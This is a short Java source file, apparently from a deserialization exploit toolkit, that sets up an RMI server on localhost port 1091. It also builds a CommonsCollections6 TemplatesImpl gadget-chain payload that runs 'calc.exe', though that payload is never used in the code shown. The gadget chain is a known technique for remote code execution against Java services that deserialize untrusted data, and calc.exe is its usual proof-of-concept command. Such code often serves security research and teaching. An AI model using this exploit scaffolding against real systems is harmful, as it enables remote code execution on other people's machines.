package org.payload.rmi.rmiServer;

import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

import static org.payload.cc.CC6.CommonsCollections6TemplatesImpl.CommonsCollections6TemplatesImpl;

public class RMIServer {
    private void start() throws Exception {
        Object seri = CommonsCollections6TemplatesImpl("calc.exe");
        Service h = new Service();
        Registry registry = LocateRegistry.createRegistry(1091);
        //registry.bind("rmi://127.0.0.1:1091/Hello", h);
        Naming.bind("rmi://127.0.0.1:1091/Hello", h);
    }
    public static void main(String[] args) throws Exception {
        new RMIServer().start();
    }
}